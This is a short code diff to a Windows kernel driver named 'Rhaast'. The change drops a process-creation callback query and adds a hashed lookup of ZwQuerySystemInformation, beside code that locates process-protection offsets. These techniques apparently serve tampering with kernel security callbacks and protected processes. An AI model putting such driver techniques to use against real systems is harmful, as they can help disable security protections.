@@ -23,8 +23,6 @@ NTSTATUS RhaastEntry(
         PUTS( "Failed to init Rhaast driver" )
         return NtStatus;
     }
-
-    RsCallbackQuery( PsCreationCallback, NULL, NULL );
     
     /* init I/O communication over IOCTLs */
     if ( ! NT_SUCCESS( NtStatus = TsIoCtlInit() ) ) {
@@ -85,7 +83,15 @@ NTSTATUS RhaastInit(
          * SignatureLevel, SectionSignatureLevel and _PS_PROTECTION */
         Instance.Ofs.ProcessProtection = DREF_U16( U_PTR( RsLdrFunction( H_API_PSISPROTECTEDPROCESSLIGHT ) ) + 0x2 ) - 0x2;
     }
+
+    /*
+     * Load ntoskrnl.exe functions
+     */
     
+    if ( ! ( Instance.Win32.ZwQuerySystemInformation = RsLdrFunction( H_API_ZWQUERYSYSTEMINFORMATION ) ) ) {
+        return STATUS_UNSUCCESSFUL;
+    }
+
     return NtStatus;
 }
 
